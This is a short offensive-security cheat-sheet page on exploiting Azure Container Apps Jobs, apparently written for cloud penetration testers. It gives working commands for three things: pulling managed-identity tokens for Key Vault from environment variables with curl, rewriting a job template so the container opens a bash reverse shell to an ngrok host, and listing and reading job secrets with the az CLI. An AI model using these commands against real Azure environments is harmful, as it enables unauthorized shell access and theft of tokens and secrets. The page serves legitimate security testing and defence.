---
title: "Azure Container Jobs Explotation"
order: 132
description: Explotation of Azure Container Jobs
---

## Get env

The Container Apps Jobs does not use IMDS the identity endpoint is stored in env variables.

```bash
env | grep -i identity
```

```bash
curl -s "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://vault.azure.net" \
  -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"
```

## Override jobs configuration

> The permissions needed are:
> - **Microsoft.App/jobs/read**
> - **Microsoft.App/jobs/write**
>
> Although jobs aren’t long‑running like container apps, you can exploit the ability to override the job’s command configuration when starting an execution. By crafting a custom job template, you can gain shell access within the container that runs the job.

First retrieve the configuration and save its template

```bash
az containerapp job show \
  --name $ACJ_NAME \
  --resource-group $RESOURCE_GROUP \
  --output yaml > job-template.yaml
```

Then override this .yaml file

```yaml
template:
  containers:
  - command:
    - /bin/bash
    - -c
    - bash -i >& /dev/tcp/x.tcp.eu.ngrok.io/PORT 0>&1
    image: ubuntu:latest
    name: job
```

```bash
az containerapp job update \
  --name $ACJ_NAME \
  --resource-group $RESOURCE_GROUP \
  --yaml job-template.yaml
```

## Read secrets

> The permissions required are:
> - **Microsoft.App/jobs/read**
> - **Microsoft.App/jobs/listSecrets/action**
>
> If you have these permissions you can list all the secrets (first permission) inside a Job container and then read the values of the secrets configured.

```bash
az containerapp job secret list --name <job-name> --resource-group $RESOURCE_GROUP
az containerapp job secret show --name <job-name> --resource-group $RESOURCE_GROUP --secret-name <secret-name>
```